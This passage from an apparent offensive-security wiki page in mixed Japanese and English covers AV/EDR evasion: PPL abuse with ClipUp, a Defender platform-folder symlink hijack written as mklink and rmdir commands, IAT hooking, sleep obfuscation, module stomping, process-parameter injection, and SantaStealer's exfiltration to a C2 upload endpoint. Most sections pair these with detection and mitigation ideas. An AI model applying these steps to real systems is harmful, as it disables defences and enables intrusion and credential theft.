- **Sysmon 12/13 without System 7045:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM installation event がない状態で correlate します。
- **Sysmon 6 -> 23:** non-Defender lineage からロードされた既知の BTR driver と、その後に `System`/PID 4 に起因する file deletion を correlate します。特に security binaries を対象とする場合は注意が必要です。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の迅速な作成と削除を alert します。
- `SeLoadDriverPrivilege` の assignment/enabling を制限および audit します。`cmd.exe`、PowerShell、または unknown process によって security-tool driver が staged されている場合、Microsoft signature だけでは十分な trust とはいえません。

## Protected Process Light (PPL) を Abuse して LOLBINs で AV/EDR を Tamper する

Protected Process Light (PPL) は signer/level hierarchy を適用し、同等以上の protected processes だけが相互に tamper できるようにします。Offensively は、PPL-enabled binary を正規の方法で launch し、その arguments を制御できる場合、benign functionality（例: logging）を、AV/EDR が使用する protected directories に対する制約付きの PPL-backed write primitive に変換できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

What makes a process run as PPL
- 対象の EXE（およびロードされるすべての DLLs）は、PPL-capable EKU で署名されている必要があります。
- Process は、次の flags を指定して CreateProcess で作成する必要があります: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- Binary の signer に一致する compatible protection level を request する必要があります（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。誤った levels では creation に失敗します。

PP/PPL と LSASS protection のより広範な intro については、こちらも参照してください:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（protection level を選択し、arguments を対象の EXE に forward します）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身を self-spawn し、caller が指定したパスに log file を書き込むための parameter を受け付けます。
- PPL process として起動すると、file write は PPL backing によって実行されます。
- ClipUp は spaces を含むパスを parse できません。8.3 short paths を使用して、通常は保護されている場所を指定します。

8.3 short path helpers
- Short names を一覧表示するには、各 parent directory で `dir /x` を実行します。
- cmd で short path を導出するには、`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA` を実行します。

Abuse chain (abstract)
1) Launcher（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp の log-path argument を渡し、保護された AV directory（例: Defender Platform）に file creation を強制します。必要に応じて 8.3 short names を使用します。
3) 対象の binary が実行中に AV によって通常 open/locked されている場合（例: MsMpEng.exe）、AV が起動する前の boot 時に write が行われるよう、より早く確実に実行される auto-start service を install して write を schedule します。Process Monitor（boot logging）で boot ordering を検証します。
4) Reboot 後、PPL-backed write が AV によって binary が lock される前に実行され、対象 file が corrupt されて startup が阻止されます。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容を配置先以外の点で制御することはできません。この primitive は、正確な内容の injection よりも corruption に適しています。
- サービスの install/start と reboot window には、local admin/SYSTEM が必要です。
- Timing が重要です。target が open されていてはなりません。boot-time execution により file lock を回避できます。

検知
- `ClipUp.exe` の process creation。特に、boot 前後に標準的でない launcher を親プロセスとして、通常とは異なる引数で起動されている場合。
- auto-start に設定された suspicious binary を持つ新しいサービスや、Defender/AV より常に先に起動するサービス。Defender の startup failure より前に行われたサービスの creation/modification を調査します。
- Defender binary/Platform directory に対する file integrity monitoring。protected-process flag を持つプロセスによる予期しない file creation/modification。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非 AV binary による anomalous な PPL level の使用を確認します。

緩和策
- WDAC/Code Integrity: PPL として実行できる signed binary と、その parent を制限します。正当な context 以外での ClipUp invocation を block します。
- Service hygiene: auto-start service の creation/modification を制限し、start-order manipulation を監視します。
- Defender tamper protection と early-launch protections が有効であることを確認します。binary corruption を示す startup error を調査します。
- 環境との互換性がある場合は、security tooling をホストする volume での 8.3 short-name generation の無効化を検討します（十分に test してください）。

## Platform Version Folder Symlink Hijack による Microsoft Defender の Tampering

Windows Defender は、次の場所にある subfolder を列挙して、実行する platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も高い lexicographic version string（例: `4.18.25070.5-0`）を持つ subfolder を選択し、その場所から Defender service process を起動します（service/registry path もそれに応じて更新されます）。この選択では、directory reparse point（symlink を含む）の directory entry が信頼されます。administrator はこれを利用して、Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- Local Administrator（Platform folder 内に directory/symlink を作成するために必要）
- reboot、または Defender platform の再選択を trigger する能力（boot 時の service restart）
- built-in tool のみ必要（mklink）

動作する理由
- Defender は自身の folder への write を block しますが、platform selection では directory entry を信頼し、target が protected/trusted path に resolve されるかを検証せずに、lexicographically 最も高い version を選択します。

手順（例）
1) 現在の platform folder の writable clone を準備します。例: `C:\TMP\AV`】【。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダを指す、より高いバージョンのディレクトリ symlink を作成します。
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 配下の新しい process path と、その場所を反映した service configuration/registry を確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender が application directory からロードする DLL を drop/replace して、Defender の processes で code を実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: version-symlink を削除すると、次回の start 時に configured path が resolve できなくなり、Defender の start に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この technique 単体では privilege escalation は実行できない点に注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) 経由でルーティングすることで、runtime evasion を C2 implant から対象モジュール自体へ移行できます。これにより、多くの kit が公開する小規模な API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs および post-exploitation DLLs にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

概要
- reflective loader（先頭に付加するか companion として配置）を使用して、対象モジュールと並べて PIC blob を stage します。PIC は self-contained かつ position-independent でなければなりません。
- host DLL の読み込み時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、対象となる import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT エントリを thin PIC wrapper を指すように patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasion を実行します。一般的な evasion には以下が含まれます。
- call 周辺での memory mask/unmask（例: beacon regions の暗号化、RWX→RX、page names/permissions の変更）を行い、call 後に復元します。
- Call-stack spoofing: benign な stack を構築し、target API へ transition することで、call-stack analysis が想定された frames に解決されるようにします。<sup>[[9]](#references)</sup>
- compatibility のため、Aggressor script（または同等のもの）が Beacon、BOFs、post-ex DLLs 用に hook 対象の API を登録できる interface を export します。

この場合に IAT hooking を使用する理由
- hook された import を使用するあらゆる code に対して機能し、tool code を変更したり、特定の API を proxy するために Beacon に依存したりする必要がありません。
- post-ex DLLs に対応します。LoadLibrary* を hook することで、module loads（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API calls に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapping することで、call-stack–based detections に対して process-spawning post-ex commands を確実に使用できるようにします。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注記
- relocations/ASLR の後、import を初めて使用する前に patch を適用する。TitanLdr/AceLdr などの Reflective loader は、loaded module の DllMain 中に hooking を行う方法を示している。
- wrapper は小さく、PIC-safe に保つ。true API は、patch 前に取得しておいた original IAT value、または LdrGetProcedureAddress 経由で解決する。
- PIC には RW → RX の遷移を使用し、writable+executable ページを残さない。

Call-stack spoofing stub
- Draugr-style PIC stub は fake call chain（benign module 内の return address）を構築し、その後 real API に pivot する。
- これにより、Beacon/BOFs から sensitive API への canonical stack を想定する detection を回避する。
- stack cutting/stack stitching technique と組み合わせ、API prologue の前に expected frame 内へ到達させる。

Operational integration
- reflective loader を post-ex DLL の先頭に付加し、DLL の load 時に PIC と hook が自動的に初期化されるようにする。
- Aggressor script を使用して target API を登録することで、コード変更なしに Beacon と BOFs が同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）address に解決される entry、import pointer の定期的な検証。
- Stack anomalies: loaded image に属さない return address、non-image PIC への突然の遷移、整合しない RtlUserThreadStart ancestry。
- Loader telemetry: IAT への in-process write、import thunk を変更する early DllMain activity、load 時に作成される予期しない RX region。
- Image-load evasion: hooking LoadLibrary* を行う場合、memory masking event と相関する automation/clr assembly の suspicious load を監視する。

Related building blocks and examples
- load 中に IAT patching を実行する reflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

reflective loader を制御できる場合、custom resolver によって loader の `GetProcAddress` pointer を置き換え、hook を先にチェックすることで、`ProcessImports()` **中に** import を hook できる:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を構築する。
- `setup_hooks()` function を export し、loader の import resolver を上書きする（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用する。hook が存在する場合はそれを返し、存在しない場合は real `GetProcAddress` に delegate する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を使用して link time に hook target を登録する。hook は resident PICO 内に存在するため有効なままとなる。

これにより、loaded DLL の code section を post-load で patch することなく、**import-time IAT redirection** が実現する。

### Forcing hookable imports when the target uses PEB-walking

Import-time hook は function が実際に target の IAT に存在する場合のみ trigger される。module が PEB-walk + hash（import entry なし）で API を解決する場合は、real import を強制して loader の `ProcessImports()` path に認識させる:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を `&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を生成するため、reflective loader が import を解決するときに interception が可能になる。

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` を patch する代わりに、implant が使用する **actual wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook する。long wait では、Ekko-style obfuscation chain で call を wrap し、idle 中に in-memory image を encrypt する:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使用して、crafted `CONTEXT` frame で `NtContinue` を呼び出す callback sequence を schedule する。
- Typical chain（x64）: image を `PAGE_READWRITE` に設定 → `advapi32!SystemFunction032` によって full mapped image を RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を走査して **per-section permission を restore** → completion を signal する。
- `RtlCaptureContext` は template `CONTEXT` を提供する。それを複数の frame に clone し、register（`Rip/Rcx/Rdx/R8/R9`）を設定して各 step を invoke する。

Operational detail: long wait（例: `WAIT_OBJECT_0`）には “success” を返し、image が masked されている間も caller が継続するようにする。この pattern は idle window 中に scanner から module を隠し、典型的な “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst。
- 大きな contiguous image-sized buffer に対する `advapi32!SystemFunction032` の使用。
- 大きな範囲の `VirtualProtect` に続く custom per-section permission restoration。

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は通常、gadget が module の CFG metadata に存在しないため、`STATUS_STACK_BUFFER_OVERRUN` で process が crash する。hardened process 内で Ekko/Kraken-style chain を維持するには:<sup>[[30]](#references)</sup>

- chain が使用するすべての indirect destination を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で register する。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**full image size** をカバーしなければならない。
- manually mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使用する。
- dispatch gadget だけでなく、indirect に到達する export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）および indirect target になる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style sleep chain は “non-CFG process でのみ動作するもの” から、`/guard:cf` で compile された `explorer.exe`、browser、`svchost.exe`、その他の endpoint で再利用可能な primitive になる。

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement は noisy であり、spoof された `Rip` が hardware shadow stack と一致する必要があるため、CET Shadow Stack system では破損する可能性がある。より安全な sleep-masking pattern は次のとおり:<sup>[[30]](#references)</sup>

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` 経由でその `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）を読み取る。
- current thread の real TEB/TIB を backup する。
- `GetThreadContext` で real sleeping context を capture する。
- real `Rip` **のみ**を spoof context に copy し、spoofed `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate stack range 内で unwind するようにする。
- wait 完了後、original TIB と thread context を restore する。

これにより CET-consistent instruction pointer を維持しつつ、TEB stack metadata を信頼して unwind を検証する EDR stack walker を誤認させる。

### APC-based alternative: Kraken Mask

timer-queue dispatch が signature として検出されやすい場合、同じ sleep-encrypt-spoof-restore sequence を queued APC を使用する suspended helper thread から実行できる:<sup>[[27]](#references)</sup>

- entrypoint として `NtTestAlert` を持つ helper thread を作成する。
- `NtQueueApcThread` で prepared `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- default 64 KB thread stack を使い切らないよう、chain state を helper stack ではなく heap に保存する。
- `NtSignalAndWaitForSingleObject` を使用して、start event の signal と block を atomically 実行する。
- TIB/context を restore する前に main thread を suspend する（`NtSuspendThread` → restore → `NtResumeThread`）。これにより、scanner が半端に restore された stack を検出する race window を短縮する。

これは `CreateTimerQueueTimer` + `NtContinue` signature を helper-thread/APC signature に置き換えつつ、同じ RC4 masking と stack-spoofing の目的を維持する。

Additional detection ideas
- sleep、wait、または APC dispatch の直前に実行される、`VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で wrap された `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` に続く、current thread の TEB/TIB stack bounds への direct write。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に indirect に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature を繰り返し使用すること。


## Precision Module Stomping

Module stomping は、明らかな private executable memory を allocate したり、新しい sacrificial DLL を load したりする代わりに、**target process 内にすでに mapped されている DLL の `.text` section から payload を実行する**。overwrite target は、**loaded された disk-backed image** とし、process が引き続き必要とする code path を破損させずに payload を収容できる code space を持つものにするべきである。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような common module に対する naive stomping は fragile である。その DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次のとおり:

1. target process の module を enumerate し、すでに load されている DLL の **names-only include list** を保持する。
2. payload を先に build し、**exact byte size** を記録する。
3. disk 上の candidate DLL を scan し、PE section **`.text` `Misc_VirtualSize`** と payload size を比較する。これは file size より重要である。mapped in memory 時の executable section の size を反映するためである。
4. **Export Address Table (EAT)** を parse し、export された function の RVA を stomp start offset として選択する。
5. **blast radius** を計算する。payload が selected function boundary を超える場合、memory 内でその後に配置された adjacent export を overwrite する。

Typical recon/selection helper は、実際の環境で次のように見られる:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- `LoadLibrary`/予期しない image loads による telemetry を避けるため、remote process に**すでにロードされている** DLL を優先する。
- target application によってほとんど実行されない exports を優先する。そうしないと、thread creation の前後に通常の code paths が stomped bytes に到達する可能性がある。
- 大規模な implants では、injector source 内でバッファー全体が正しく表現されるよう、shellcode の埋め込みを string literal から **byte-array/braced initializer** に変更する必要がある場合が多い。

Detection ideas
- より一般的な private RWX/RX allocations ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）への remote writes。
- memory 上の export entry points の bytes が、disk 上の backing file と一致しなくなっている状態。
- 最近 first bytes が変更された正規 DLL export 内から execution を開始する remote threads または context pivots。
- DLL `.text` pages に対する、thread creation に続く不審な `VirtualProtect(Ex)` / `WriteProcessMemory` sequences。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来の remote write path（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique である。すでに実行中の target に bytes をコピーする代わりに、Windows が `CreateProcessW` の startup parameters の一部を child process に**コピーし**、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存する仕組みを悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

有用な carriers は次のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` 使用時） → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` に対して **writable memory** を指している必要があり、null terminator を含めて **32,767 Unicode characters** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` strings で構成され、追加の `\0` で終端された Unicode environment block である必要がある。
- `lpReserved` は公式には予約済みであるため、`ShellInfo` の mapping は、安定した documented contract ではなく implementation detail として扱うべきである。

これにより、通常の process creation が **payload-transfer primitive** に変わる。operator は attacker-controlled startup data を指定して child process を作成し、Windows に cross-process copy を実行させる。

### Remote lookup flow without remote write APIs

child の作成後、**read-only** primitives を使用してコピーされたバッファーを解決する：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. remote `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択した pointer を使用：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されている main thread handle を再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

classic thread hijacking workflow とは異なり、これは **`SuspendThread` / `ResumeThread` を必要としません**。返された main thread handle に対して直接 context を変更できます。

これにより、injection で一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避可能

### Null-byte の制限と staged shellcode

3 つの carrier はすべて **string または string-like data** であるため、`0x00` を含む raw payload は transfer 中に切り詰められます。実用的な workaround は、runtime で constants を再構築し、その後 arbitrary な second stage を読み込む **null-free first stage** です。

単純なパターンとして、XOR ベースの constant synthesis があります。
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
これにより、第1ステージは、転送されるパラメータ内に null byte を埋め込まずに、スタック文字列、API 引数、DLL パス、または第2ステージの shellcode loader を構築できます。

### 第1ステージからのスタックベース API 呼び出し

第1ステージで `LoadLibraryA` などの API を呼び出す必要がある場合、次の処理を実行できます。

- 対象プロセスのスタックに文字列/バッファを push する
- **32-byte x64 shadow space** を予約する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte aligned** に維持する

その後、第2ステージをスタックから `PAGE_READWRITE` の allocation にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接的な RWX allocation を回避できます。

### Detection ideas

著者が挙げている有効な hunting 機会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって **process-parameter pages を executable にする**操作
- その保護変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る操作
- プロセス作成時の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` における、異常に長い、または高エントロピーの値

### Notes

- P3 は **cross-process transfer trick** であり、それ自体は完全な execution primitive ではありません。コピーされたパラメータには、依然として execute-permission の変更と execution redirection method が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者によって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの suspicious primitives に到達するため、採用されませんでした。

## Fileless Evasion と Credential Theft における SantaStealer Tradecraft

SantaStealer（別名 BluelineStealer）は、現代の info-stealer が AV bypass、anti-analysis、credential access を単一の workflow に組み合わせる方法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layout gating と sandbox delay

- 設定フラグ（`anti_cis`）は、`GetKeyboardLayoutList` を使用してインストール済みの keyboard layout を列挙します。Cyrillic layout が見つかった場合、サンプルは空の `CIS` marker を作成してから、stealer を実行せずに終了します。これにより、除外対象の locale では決して detonates せず、同時に hunting artifact を残します。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、debugger/sandbox 用の組み込み blocklist と比較する。また、コンピューター名にも同じチェックサムを適用し、`C:\analysis` などの作業ディレクトリをチェックする。
- Variant B はシステムプロパティ（プロセス数の下限、直近の uptime）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出する。また、sleep 前後のタイミングをチェックして single-stepping を検出する。いずれかに該当すると、modules の起動前に中止する。

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXE は Chromium credential helper を埋め込んでおり、ディスクに drop するか、メモリ上に手動で map する。fileless mode では imports/relocations を自ら解決するため、helper の痕跡は書き込まれない。
- その helper は、second-stage DLL を ChaCha20 で二重に暗号化して保存する（32-byte key 2個 + 12-byte nonce 2個）。2回の処理後、blob を reflectively load し（`LoadLibrary` は使用しない）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator の routines は direct-syscall reflective process hollowing を使用して稼働中の Chromium browser に inject し、AppBound Encryption keys を引き継ぎ、ABE hardening にもかかわらず SQLite databases から passwords/cookies/credit cards を直接 decrypt する。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` function-pointer table を反復処理し、有効化された各 module（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとに1つの thread を生成する。各 thread は共有 buffers に結果を書き込み、約45秒の join window 後に file count を報告する。
- 完了すると、すべてのデータを statically linked `miniz` library で `%TEMP%\\Log.zip` として zip 化する。その後 `ThreadPayload1` は15秒 sleep し、archive を10 MB chunks に分割して、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を spoof しながら HTTP POST で `http://<C2>:6767/upload` に stream する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` を追加し、最後の chunk には `complete: true` を付加して、C2 に reassembly の完了を知らせる。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – マルウェアの call stacks にもはや free pass はない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust を信頼すべきか？Zscaler posture checks の bypass](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware operations を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：Forwarded Exports の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) の backing による EDRs への対抗](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の protective shell を破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の内側：RAT から builder、coder まで](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer が街にやって来る：新たな意欲的な infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
